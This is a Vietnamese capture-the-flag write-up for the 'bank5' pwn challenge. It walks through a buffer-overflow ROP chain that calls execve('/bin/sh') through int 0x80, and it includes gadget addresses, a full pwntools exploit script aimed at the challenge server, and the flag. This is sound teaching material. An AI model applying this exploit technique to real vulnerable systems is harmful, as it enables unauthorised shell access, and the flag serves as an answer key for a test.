## ⚡ [bank5](https://ctf.hcmus.edu.vn/challenges#bank5-13)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/168-pts-brightgreen.svg)](https://img.shields.io/badge/168-pts-brightgreen.svg)

Tác giả: `xikhud`

Tags: `pwn` `bof` `rop` `ret2syscall`

### Summary

Chạy thử chương trình thì thấy nó giống challange `bank1` trước đó, lần này thì ta có thêm file binary.

Không có shellcode, không có `/bin/sh`, không có `/bin/cat`. Vậy ta phải dùng ROP để gọi syscall `execve`.

Xem cách dùng ROP tại [bank4](../../bank4/README.md).

### Exploit

**Phần 1**: Đọc chuỗi `/bin/sh` vào bộ nhớ `bss` thông qua việc tận dụng lại hàm `gets`.

```bash 
$ objdump -t bank5 | grep gets
00000000 l    df *ABS*  00000000 getsysstats.o
08050140  w    F .text  0000018c gets
```

Lấy địa chỉ vùng nhớ `bss`.

```bash 
$ objdump -t bank5 | grep [.]bss
080da320 l    d  .bss   00000000 .bss
```

ROPgadget clear argument của hàm `gets` vừa gọi:

```bash
$ ROPgadget --binary bank5 --only 'pop|ret' | grep 'eax'
...
0x0809d514 : pop eax ; ret # useful
...
```

Payload phần 1:

`payload = A*offset + gets_addr + eax_ret + bss_addr`

**Phần 2**: Gọi syscall `execve("/bin/sh", NULL, NULL)`

Request syscall:

```bash
$ ROPgadget --binary bank5 --only 'pop|ret' | grep 'eax'
...
0x0809d514 : pop eax ; ret # useful
...
```

`payload += eax_ret + 0xb # call syscall number 0xb`

Control 3 tham số sau của syscall execve bằng cách đẩy chúng vào thanh ghi `ebx, ecx, edx`:

```bash 
$ ROPgadget --binary bank5 --only 'pop|ret' | grep 'ebx' | grep 'edx' | grep 'ecx'
0x0806dfd1 : pop edx ; pop ecx ; pop ebx ; ret
```

`payload += edx_ecx_ebx_ret + 0 + 0 + bss_addr`

Trigger syscall bằng cách thực thi `int 0x80`:

```bash
$ ROPgadget --binary bank5 --only 'int'
Gadgets information
============================================================
0x08049553 : int 0x80

Unique gadgets found: 1
```

`payload += int_0x80`

Đến đây ta chỉ cần gửi thêm `shell` nữa là có thể lấy được shell.

`payload += "/bin/sh\x00"`
  
### Code

```python
#!/usr/bin/env python3

from pwn import *
from platform import architecture

path = './bank5'
elf = ELF(path, checksec=False)

def conn():
    if args.LOCAL:
        return process(path)
    else:
        return remote("61.28.237.24", 30206)
        
offset = 80         
context.arch = 'i386' if ('32bit' in architecture(path.split(' ')[0])) else 'amd64'

int_80 = 0x08049553
bss_addr = elf.bss()

print(hex(bss_addr))

edx_ecx_ebx_ret = 0x0806dfd1
eax_ret = 0x0809d514
gets_addr = 0x08050140

def main():    
    sh = conn();

    payload = b'A'*offset + p32(gets_addr) + p32(eax_ret) + p32(bss_addr) # sections 1: read /bin/sh to bss section
    payload += p32(eax_ret) + p32(0xb) # call syscall
    
    payload += p32(edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bss_addr) + p32(int_80)

    sh.sendlineafter('[+] Please enter your name: ', payload)
    
    sh.send(b'/bin/sh\x00') # send shell
    
    sh.sendline(b'cat flag.txt;echo;exit') # get flag
    
    sh.interactive()

if __name__ == "__main__":
    main()

```

📫 Flag: **`HCMUS-CTF{rop_and_shellcode}`**

Reference:

- [CTF-Wiki](https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall)

- [hipwn](https://ctftime.org/writeup/26223)

---
*[Back to table of contents](../README.md)*
